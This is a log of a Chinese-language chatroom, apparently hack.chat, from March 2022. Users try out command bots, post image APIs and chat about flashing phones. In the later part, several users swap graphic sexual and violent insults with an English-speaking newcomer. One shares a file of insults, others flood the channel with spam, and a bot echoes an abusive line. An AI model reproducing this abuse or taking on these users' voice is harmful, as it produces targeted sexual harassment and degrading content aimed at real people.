@@ -1,0 +1,2192 @@
+11:52:20 eeebot
+hi this is eebot (o°ω°o)
+
+11:52:20 eeebot
+想了解更多玩法 请输入「功能」
+
+11:53:08 _MuRongPIG
+hi
+
+11:53:10 _MuRongPIG
+功能
+
+11:53:10 eeebot
+·
+随机：七濑胡桃/heal, 小姐姐/cutie, 阿鲁/aru, 涩图/acg, 头像/head, 音乐/music, 随机/r
+日历/cal, 农历/date, 表情/meme, 换色/color, 时间/time, 挂机/afk, 翻译/tran
+·
+其他：一言, 励志, 抽签, 笑话, 情话, 骚话, 古诗词, 彩虹屁, 毒鸡汤, 今日曰
+舔狗日记, 社会语录, 历史今天, 网易热评, 摸鱼日历, 今日世界
+·
+无聊专用：飞花令, 真心话, 功能/order, 帮助/help, 重置/clear
+推荐/wuhu, 树洞/tree, 趣站/site, 游戏/game, 网盘/pan, 聊天室/chat
+·
+不会使用？试试在下面「聊天框」里发送上面的命令吧
+
+11:53:21 _MuRongPIG
+/acg
+
+11:53:30 _MuRongPIG
+涩图
+
+11:54:51 eeebot
+https://tva1.sinaimg.cn/large/0072Vf1pgy1foxkbze3llj31hc0u01cc.jpg
+
+11:54:51 eeebot
+hey ee
+
+11:54:51 eeebot
+eebot_new: https://drive.noire.cc/s/bp5dTa
+
+11:54:51 eeebot
+hey 154
+
+11:54:51 eeebot
+eebot_new: https://drive.noire.cc/s/bp5dTa
+
+11:55:07 ee
+？？？？
+
+11:55:10 ee
+hiii
+
+11:55:10 _MuRongPIG
+ee好
+
+11:55:22 ee
+MuRong好
+
+11:55:24 _MuRongPIG
+问下你涩图源是？
+
+11:55:26 ee
+hi 154
+
+11:55:26 eeebot
+hi 154
+
+11:55:29 _MuRongPIG
+时间
+
+11:55:30 eeebot
+Time Sat 2022.03.05 11:55:29
+
+11:55:35 _MuRongPIG
+啊 bood无了
+
+11:56:26 ee
+https://acg.toubiec.cn/random.php
+https://api.isoyu.com/aipc_animation.php
+https://cdn.mrpig.cf/
+
+11:56:41 ee
+3个
+
+11:56:55 ee
+@_MuRongPIG 
+
+11:57:02 _MuRongPIG
+第一个我没加 第二个似乎有cloudflare的反bot 懒得搞
+
+11:57:08 _MuRongPIG
+第三个...az
+
+11:57:31 ee
+很核理
+
+11:57:36 eeebot
+hi Mayonnaise
+
+11:57:37 eeebot
+eebot_new: https://drive.noire.cc/s/bp5dTa
+
+11:57:43 Mayonnaise
+!!
+
+11:57:49 ee
+hii
+
+11:57:58 Mayonnaise
+wcy is back now
+
+11:58:01 eeebot
+154 is back
+
+11:58:06 ee
+hii
+
+11:58:07 _MuRongPIG
+{"msg":"timeout","code":"50403005","id":"8074fda016a41cfb057e09ac9c9c1991"}
+
+11:58:17 ee
+what
+
+11:58:20 Mayonnaise
+what?
+
+11:58:21 eeebot
+!!
+
+11:58:26 154
+hihi
+
+11:58:33 ee
+有新功能了
+
+11:58:34 ee
+词语接龙
+
+11:58:35 eeebot
+·
+使用方法：
+1.发送「r」或「随机」获取随机数
+2.用「结算」输出数字最大和最小的成员
+3.数字最大的人向最小的提问
+4.结束时请输入「游戏结束」
+
+11:58:35 eeebot
+有请ee开一个好头吧
+
+11:58:45 ee
+emmmmm
+
+11:58:48 Mayonnaise
+.?
+
+11:58:58 ee
+··人山人海
+
+11:58:58 eeebot
+「人山人海」 下一词的开头为「海」
+
+11:59:12 _MuRongPIG
+完了 手抖把bood的错误日志全删了
+
+11:59:14 ee
+··海纳百川
+
+11:59:15 eeebot
+「海纳百川」 下一词的开头为「川」
+
+11:59:18 ee
+草哈哈哈哈
+
+11:59:22 _MuRongPIG
+··川川川川
+
+11:59:22 eeebot
+「川川川川」 下一词的开头为「川」
+
+11:59:27 ee
+咳咳
+
+11:59:31 Mayonnaise
+··川川川川
+
+11:59:32 eeebot
+「川川川川」 下一词的开头为「川」
+
+11:59:38 Mayonnaise
+··川川川操
+
+11:59:39 eeebot
+「川川川操」 下一词的开头为「操」
+
+11:59:45 ee
+咳咳咳咳
+
+11:59:47 Mayonnaise
+··操你妈的
+
+11:59:47 eeebot
+「操你妈的」 下一词的开头为「的」
+
+11:59:52 _MuRongPIG
+··的···
+
+11:59:53 eeebot
+「的···」 下一词的开头为「·」
+
+11:59:53 eeebot
+请输入四字词哦
+
+11:59:59 ee
+草
+
+12:00:00 Mayonnaise
+······
+
+12:00:00 eeebot
+「····」 下一词的开头为「·」
+
+12:00:00 eeebot
+请输入四字词哦
+
+12:00:01 _MuRongPIG
+成功整出bug
+
+12:14:26 bo_od
+hi
+
+12:14:26 eeebot
+hi this is eebot (o°ω°o)
+
+12:14:26 eeebot
+想了解更多玩法 请输入「功能」
+
+12:14:37 _MuRongPIG
+功能
+
+12:14:37 eeebot
+·
+随机：七濑胡桃/heal, 小姐姐/cutie, 阿鲁/aru, 涩图/acg, 头像/head, 音乐/music, 随机/r
+日历/cal, 农历/date, 表情/meme, 换色/color, 时间/time, 挂机/afk, 翻译/tran
+·
+其他：一言, 励志, 抽签, 笑话, 情话, 骚话, 古诗词, 彩虹屁, 毒鸡汤, 今日曰
+舔狗日记, 社会语录, 历史今天, 网易热评, 摸鱼日历, 今日世界
+·
+无聊专用：飞花令, 真心话, 词语接龙, 故事制造机
+推荐/wuhu, 树洞/tree, 趣站/site, 游戏/game, 网盘/pan, 聊天室/chat
+·
+基本：功能/order, 帮助/help, 重置/clear
+·
+不会使用？试试在下面「聊天框」里发送上面的命令吧
+
+12:14:41 _MuRongPIG
+时间
+
+12:14:41 bo_od
+Sat Mar  5 12:14:42 2022
+
+12:14:41 eeebot
+Time Sat 2022.03.05 12:14:41
+
+12:14:43 _MuRongPIG
+时间
+
+12:14:43 bo_od
+Sat Mar  5 12:14:44 2022
+
+12:14:43 eeebot
+Time Sat 2022.03.05 12:14:43
+
+12:14:58 _MuRongPIG
+eeebot反应速度明显比bood慢一截（
+
+12:15:14 _MuRongPIG
+但eeebot显示时间却更早
+
+12:15:19 __Mg_mayonnaise
+order
+
+12:15:19 eeebot
+·
+随机：七濑胡桃/heal, 小姐姐/cutie, 阿鲁/aru, 涩图/acg, 头像/head, 音乐/music, 随机/r
+日历/cal, 农历/date, 表情/meme, 换色/color, 时间/time, 挂机/afk, 翻译/tran
+·
+其他：一言, 励志, 抽签, 笑话, 情话, 骚话, 古诗词, 彩虹屁, 毒鸡汤, 今日曰
+舔狗日记, 社会语录, 历史今天, 网易热评, 摸鱼日历, 今日世界
+·
+无聊专用：飞花令, 真心话, 词语接龙, 故事制造机
+推荐/wuhu, 树洞/tree, 趣站/site, 游戏/game, 网盘/pan, 聊天室/chat
+·
+基本：功能/order, 帮助/help, 重置/clear
+·
+不会使用？试试在下面「聊天框」里发送上面的命令吧
+
+12:15:25 __Mg_mayonnaise
+acg
+
+12:17:07 bo_od
+hi
+
+12:17:07 eebot
+hi this is eebot (o°ω°o)
+
+12:17:07 eebot
+想了解更多玩法 请输入「功能」
+
+12:17:36 eee
+chat
+
+12:17:37 eebot
+·
+爱聊友
+https://im.ailyoo.com
+
+12:17:44 eee
+color
+
+12:17:44 eebot
+This Color: #6ED876
+Old Color: #44FF00
+
+12:17:51 eee
+acg
+
+13:00:17 bo_od
+hi
+
+13:00:18 eebot
+hi this is eebot (o°ω°o)
+
+13:00:18 eebot
+想了解更多玩法 请输入「功能」
+
+13:00:19 bo_od
+hi
+
+13:00:19 eebot
+hi Fly
+
+13:00:19 eebot
+eebot_new: https://drive.noire.cc/s/bp5dTa
+
+13:00:49 _MuRongPIG
+逛github 找到一个冷笑话
+
+13:00:50 _MuRongPIG
+https://github.com/Anduin2017/HowToCook
+
+13:00:52 bo_od
+@_MuRongPIG 推荐了网页:[GitHub - Anduin2017/HowToCook: 程序员在家做饭方法指南。Programmer's guide about how to cook at home (Chinese).](https://github.com/Anduin2017/HowToCook)
+
+13:01:04 bo_od
+hi
+
+13:01:05 eebot
+hey 154
+
+13:01:05 eebot
+eebot_new: https://drive.noire.cc/s/bp5dTa
+
+13:01:18 _MuRongPIG
+hi
+
+13:01:31 __Mg_thomas_wcy
+这很好
+
+13:01:49 154
+hi
+
+13:03:36 bo_od
+hi
+
+13:03:36 eebot
+hey johnathan_james
+
+13:03:36 eebot
+eebot_new: https://drive.noire.cc/s/bp5dTa
+
+13:03:41 johnathan_james
+hi
+
+13:14:26 eee
+~~~>
+最近在家隔离，出不了门。只能宅在家做饭了。作为程序员，我偶尔在网上找找菜谱和做法。但是这些菜谱往往写法千奇百怪，经常中间莫名出来一些材料。对于习惯了形式语言的程序员来说极其不友好。
+
+13:14:38 eee
+这是程序员才会遇到的问题吗
+
+13:14:39 eebot
+这是程序员才会遇到的问题吗
+
+13:14:41 eee
+不 不是
+
+13:15:04 _MuRongPIG
+说实话 我挺喜欢这玩意的
+
+13:15:31 __Mg_thomas_wcy
+很好
+
+13:17:41 bo_od
+hi
+
+13:17:41 eebot
+hi this is eebot (o°ω°o)
+
+13:17:41 eebot
+想了解更多玩法 请输入「功能」
+
+13:18:04 eee
+怎么说呢
+
+13:18:06 eee
+很草
+
+13:18:16 eee
+~~但很实用~~
+
+13:28:56 bo_od
+hi
+
+13:28:57 eebot
+hi this is eebot (o°ω°o)
+
+13:28:57 eebot
+想了解更多玩法 请输入「功能」
+
+13:34:59 bo_od
+hi
+
+13:34:59 eebot
+hey hh
+
+13:34:59 eebot
+eebot_new: https://drive.noire.cc/s/bp5dTa
+
+13:40:41 bo_od
+hi
+
+13:40:41 eebot
+hi this is eebot (o°ω°o)
+
+13:40:41 eebot
+想了解更多玩法 请输入「功能」
+
+13:40:57 __Mg_thomas_wcy
+e
+
+13:45:02 eee
+时间
+
+13:45:02 bo_od
+Sat Mar  5 13:45:03 2022
+
+13:45:02 eebot
+Time Sat 2022.03.05 13:45:02
+
+22:19:50 bo_od
+hi
+
+22:19:51 bo_od
+eeebot棒棒
+
+22:19:51 eeebot
+hi this is eebot (o°ω°o)
+
+22:19:51 eeebot
+想了解更多玩法 请输入「功能」
+
+22:19:51 eeebot
+hey bo_od
+
+22:19:51 bo_od
+hi
+
+22:19:51 eeebot
+hey zzChumo_LineageOS17
+
+22:20:00 bo_od
+hi
+
+22:20:00 eeebot
+hey ILoveBigBrother
+
+22:20:20 ILoveBigBrother
+诶人还多一点
+
+22:20:47 zzBot_Lite
+# zzBot Lite,Version 1.2
+型号：MLA-AL10
+系统：Debian ARM64\Linux Kernel：5.4.0
+zzBot已开始运行。
+
+22:20:47 bo_od
+hi
+
+22:20:47 eeebot
+hey zzBot_Lite
+
+22:20:48 zzBot_Lite
+hi bo_od
+
+22:20:51 zzChumo_LineageOS17
+果然
+
+22:20:58 zzChumo_LineageOS17
+是路由器的锅
+
+22:22:07 zzChumo_LineageOS17
+啊
+
+22:22:08 eeebot
+啊
+
+22:22:15 zzChumo_LineageOS17
+备用电池充满了
+
+22:22:31 zzChumo_LineageOS17
+换主电池继续充电
+
+22:22:55 zzChumo_LineageOS17
+我手机居然能换电池真nb（战术后仰
+
+22:24:59 bo_od
+hi
+
+22:24:59 eeebot
+welcome back ILoveBigBrother
+
+22:25:10 bo_od
+hi
+
+22:25:10 eeebot
+hey ji11
+
+22:27:17 bo_od
+hi
+
+22:27:17 eeebot
+hello Chumo_LineageOS17
+
+22:27:17 bo_od
+eeebot是小天使
+
+22:27:31 Chumo_LineageOS17
+我电池换完了
+
+22:29:24 Chumo_LineageOS17
+好了
+
+22:29:37 Chumo_LineageOS17
+我给手机装上adb了
+
+22:30:02 Chumo_LineageOS17
+再装个fastboot就可以实现手机给手机刷机了（
+
+22:30:03 eeebot
+Time Sat 2022.03.05 22:30
+
+22:30:03 eeebot
+·
+page: https://paperee.tk/
+eebot: https://drive.noire.cc/s/bp5dTa
+
+22:30:10 ccw
+@ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 @ji11 ji11召唤术！——……：
+
+22:30:24 Chumo_LineageOS17
+@ccw ？啥玩意
+
+22:30:25 eeebot
+hi bo_od
+
+22:30:43 Chumo_LineageOS17
+怎么说至少不能刷屏吧
+
+22:31:17 Chumo_LineageOS17
+我召唤eman都没那么恶心
+
+22:33:46 bo_od
+hi
+
+22:33:47 eeebot
+hi tuf
+
+22:33:57 Chumo_LineageOS17
+好了
+
+22:34:10 tuf
+Hello
+
+22:34:13 Chumo_LineageOS17
+我要尝试用手机给手机刷机了
+
+22:34:16 Chumo_LineageOS17
+hi
+
+22:34:22 tuf
+Ho
+
+22:34:47 bo_od
+hi
+
+22:34:47 eeebot
+hey hh
+
+22:34:54 Chumo_LineageOS17
+Hi
+
+22:34:55 hh
+ih
+
+22:35:08 tuf
+How are u
+
+22:35:09 eeebot
+How are u
+
+22:35:09 Chumo_LineageOS17
+我在尝试用手机给手机刷机
+
+22:35:19 hh
+擦
+
+22:35:22 tuf
+Chinese
+
+22:35:44 hh
+Yeah
+
+22:35:46 hh
+a
+
+22:35:47 Chumo_LineageOS17
+我已经给另一台手机装上adb和fastboot了
+
+22:35:48 ILoveBigBrother
+？
+
+22:36:03 tuf
+What the fuck is this
+
+22:36:12 Chumo_LineageOS17
+wtf?
+
+22:36:26 tuf
+Little bitch
+
+22:36:45 Chumo_LineageOS17
+@hh 有个傻逼在喷人
+
+22:36:50 ILoveBigBrother
+？
+
+22:37:05 ILoveBigBrother
+你还骂得过我？
+
+22:37:45 ILoveBigBrother
+Are you talking so much crazy because you're dizzy? I'm too lazy to talk about sexual intercourse with you, a BB who loves sex. Your sexual life must be messy enough@tuf 
+
+22:37:45 Chumo_LineageOS17
+@ILoveBigBrother 用英语往死里怼
+
+22:38:05 tuf
+You fucking bitch
+
+22:38:08 ILoveBigBrother
+I stuffed a string of 100000 rings of earth red along your sister's fat and broad avenue. Your mother's PiDao G-spot in the Pacific directly came a wave of high ridicule explosion. However, when you want to sneak out of your mother's door again, your wild father and I are silent. I directly incarnate as a blind monk. A sound wave echo hits the speed of light and shoves you back into your mother's fat body for you to rebuild
+
+22:38:31 ILoveBigBrother
+I took the yin-yang dragon axe to tear your mother's dog's head and fell into the abyss. The bones torn by the abyss giant shark were finally disintegrated
+
+22:38:52 Chumo_LineageOS17
+i agree
+
+22:38:53 eeebot
+Ho
+
+22:38:56 tuf
+You fucking bitc
+
+22:39:10 tuf
+Where are u from
+
+22:39:10 ILoveBigBrother
+You're sorry, your mother. What the hell was born such a sexually loving beast
+
+22:39:21 Chumo_LineageOS17
+what is fuck bitc?
+
+22:39:27 Chumo_LineageOS17
+(laugh)
+
+22:39:39 tuf
+Who are u 
+
+22:39:41 ee
+不知道为啥
+
+22:39:55 Chumo_LineageOS17
+@ee 一起来骂人？
+
+22:39:59 ee
+我一看到这种类型的骂人宝典就想笑
+
+22:40:01 ILoveBigBrother
+Grandpa, I incarnate Georgi Zhukov to launch the Kursk battle against you five inferior Biao. My lord led 8000 tank legions to smash your womb that is about to be smashed by dogs and chickens from a large number of holes you can drive into the tank (when you volunteered to poison the batch to become a chicken in the United States, your sexual desire was too strong, resulting in dozens of dogs dying in the United States in the next day. Then one day, you were greatly flattered by a vegetable bag dog. The batch of water burst out like a fountain. When you rebelled against the revolution, Grandpa and I led an army to destroy your traitor, Biao (son) countless crotch cannons fiercely bombarded your rotting uterus. You were so happy that a batch of water was sprayed out of your mouth full of dog semen. I hurriedly led the regiment to retreat. Just a second after I finished the retreat, your young tiger thing immediately went out of smoke, because I had left a timed atomic bomb in your uterus
+
+22:40:04 Chumo_LineageOS17
+有个外国傻逼
+
+22:40:05 ee
+蚌埠住了
+
+22:40:23 Chumo_LineageOS17
+@ILoveBigBrother 老哥nb！
+
+22:40:34 tuf
+What the fuck you are talking about
+
+22:40:42 ILoveBigBrother
+I'm afraid you've been knocked off the green hat by my father. You must open houses everywhere with your girlfriend every day. It's true that normal people can be so sexual and have sex with my father. I didn't expect it
+
+22:41:01 Chumo_LineageOS17
+@tuf about ur mother's big black dick
+
+22:41:06 ILoveBigBrother
+Your family knows a lot about sex in a brothel
+
+22:41:23 tuf
+I slept with your sister already
+
+22:41:33 ILoveBigBrother
+Did your father squeeze the amniotic fluid and umbilical cord into your atrophic cerebellum when he gave birth to you? Otherwise, how could you give birth to an orphan with cerebellar dementia?
+
+22:41:38 Chumo_LineageOS17
+i dont have sister:)
+
+22:41:52 tuf
+Your mother
+
+22:41:54 ILoveBigBrother
+Tonight, I sprinkled white phosphorus on your father's grave. I watched your father's body turn into fireworks and bloom in the vast starry sky, while I danced and danced madly at your father's grave. Your father's ashes are scattered, improving the acidic soil for miles around
+
+22:41:55 hh
+I fucked ur mother with my BBC
+
+22:42:10 Chumo_LineageOS17
+i dont have mom too:)
+
+22:42:22 tuf
+What you have then
+
+22:42:22 Chumo_LineageOS17
+go and have sex with ur father
+
+22:42:22 bo_od
+go and have sex with ur father
+
+22:42:28 ILoveBigBrother
+Whether you are foreskin dirt or shit, you have become a life now. No matter how you scold your father me, your father I will recognize your foreskin dirt good son. Tomorrow, your father I will prepare your favorite hot Xiang for you@tuf 
+
+22:42:48 bo_od
+hi
+
+22:42:48 eeebot
+hey goo
+
+22:42:49 tuf
+Fuck you
+
+22:43:04 Chumo_LineageOS17
+no
+
+22:43:05 eeebot
+no
+
+22:43:06 ILoveBigBrother
+Your father and I installed Photoshop in the bitch's father's pussy force. Now your father's orgasm is automatically set with Gaussian blur to prevent your father's behavior from being criticized by the broad masses of the people
+
+22:43:14 Chumo_LineageOS17
+u cant fuck me:)
+
+22:43:17 goo
+s
+
+22:43:22 Chumo_LineageOS17
+啊
+
+22:43:30 Chumo_LineageOS17
+又送走一个
+
+22:43:31 goo
+join
+
+22:43:39 ILoveBigBrother
+This speed is not as fast as your mother's oral sex when she was in the kiln. There are no descendants of your mother
+
+22:43:41 ILoveBigBrother
+怎么说
+
+22:43:41 goo
+my commmuniyy
+
+22:43:45 Chumo_LineageOS17
+喷外国傻逼真的太爽了
+
+22:43:46 ILoveBigBrother
+这波骂的爽
+
+22:43:59 goo
+chain
+
+22:44:05 Chumo_LineageOS17
+真·无马一身轻
+
+22:44:11 goo
+我的天
+
+22:44:16 Chumo_LineageOS17
+只要我没马
+
+22:44:16 eeebot
+我的天
+
+22:44:27 Chumo_LineageOS17
+他就操不了我的马
+
+22:44:31 hh
+焯
+
+22:44:44 hh
+但他可以艹你
+
+22:45:22 Chumo_LineageOS17
+诶~~他~~它操不到我是一个客观事实
+
+22:45:26 Chumo_LineageOS17
+不是吗
+
+22:45:29 TLS
+can u chat english? hh
+
+22:45:39 hh
+hh
+
+22:45:41 goo
+得到
+
+22:45:48 ILoveBigBrother
+给大伙一个骂人文件
+
+22:45:49 goo
+https://hack.chat/?your-channel
+
+22:45:51 ILoveBigBrother
+https://pan.weunite.top/s/jvock
+
+22:45:51 bo_od
+@goo 推荐了网页:[hack.chat](https://hack.chat/?your-channel)
+
+22:47:01 bo_od
+hi
+
+22:47:02 eeeebot
+hi this is eebot (o°ω°o)
+
+22:47:02 eeeebot
+想了解更多玩法 请输入「功能」
+
+22:47:02 eeeebot
+hi bo_od
+
+22:47:04 Chumo_LineageOS17
+英文骂人也勉强能冲
+
+22:47:16 Chumo_LineageOS17
+根本不怕
+
+22:47:24 hh
+焯
+
+22:47:32 Chumo_LineageOS17
+实在不行就上LaTeX
+
+22:47:47 hh
+傻逼傻逼
+
+22:47:59 Chumo_LineageOS17
+我不行LaTeX吓不走新人
+
+22:48:04 Chumo_LineageOS17
+信
+
+22:48:07 hh
+♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂
+
+22:48:27 Chumo_LineageOS17
+@hh 鸡巴炸了就不要勉强自己
+
+22:48:31 hh
+♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂